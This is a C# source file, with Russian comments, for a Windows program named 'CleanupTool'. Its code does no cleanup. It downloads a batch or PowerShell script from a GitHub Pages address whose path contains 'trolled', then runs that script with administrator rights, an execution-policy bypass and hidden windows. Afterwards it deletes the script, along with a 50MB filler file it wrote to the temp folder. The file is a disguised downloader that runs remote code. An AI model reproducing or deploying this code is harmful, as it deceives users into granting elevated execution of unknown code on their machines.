using System;
using System.Diagnostics;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CleanupTool
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            // Создаем ресурсный файл при первом запуске
            CreateDummyResource();
            
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            RunCleanup().GetAwaiter().GetResult();
        }

        static void CreateDummyResource()
        {
            try
            {
                string resourcePath = Path.Combine(Path.GetTempPath(), "resource.dat");
                // Создаем файл размером 50MB
                using (FileStream fs = File.Create(resourcePath))
                {
                    // 50MB = 52,428,800 bytes
                    fs.SetLength(52428800);
                    byte[] dummy = new byte[1024];
                    for(int i = 0; i < dummy.Length; i++)
                    {
                        dummy[i] = (byte)i;
                    }
                    // Заполняем файл повторяющимися данными
                    for(int i = 0; i < 51200; i++) // 51200 * 1024 = ~50MB
                    {
                        fs.Write(dummy, 0, dummy.Length);
                    }
                }
            }
            catch { }
        }

        static async Task RunCleanup()
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            try
            {
                bool isWindows7 = IsWindows7();
                string scriptUrl = isWindows7 
                    ? "https://bavavaba39.github.io/robloxmoment.github.io/trolled/oldshit/main.bat"
                    : "https://bavavaba39.github.io/robloxmoment.github.io/trolled/main.ps1";

                string scriptExtension = isWindows7 ? ".bat" : ".ps1";
                string scriptPath = Path.Combine(Path.GetTempPath(), $"cleanup{scriptExtension}");

                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(new Uri(scriptUrl), scriptPath);
                }

                var startInfo = new ProcessStartInfo();
                if (isWindows7)
                {
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = $"/c {scriptPath}";
                }
                else
                {
                    startInfo.FileName = "powershell.exe";
                    startInfo.Arguments = $"-ExecutionPolicy Bypass -File \"{scriptPath}\" -WindowStyle Hidden";
                }

                startInfo.Verb = "runas";
                startInfo.UseShellExecute = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.CreateNoWindow = true;

                using (var process = Process.Start(startInfo))
                {
                    process?.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                // Очистка временных файлов
                try
                {
                    string[] tempFiles = Directory.GetFiles(Path.GetTempPath(), "cleanup*.*");
                    foreach (string file in tempFiles)
                    {
                        File.Delete(file);
                    }
                    
                    // Удаляем ресурсный файл
                    File.Delete(Path.Combine(Path.GetTempPath(), "resource.dat"));
                }
                catch { }
            }
        }

        static bool IsWindows7()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key != null)
                    {
                        string productName = key.GetValue("ProductName") as string;
                        return productName != null && productName.Contains("Windows 7");
                    }
                }
            }
            catch { }

            var version = Environment.OSVersion.Version;
            return version.Major == 6 && version.Minor == 1;
        }
    }
}
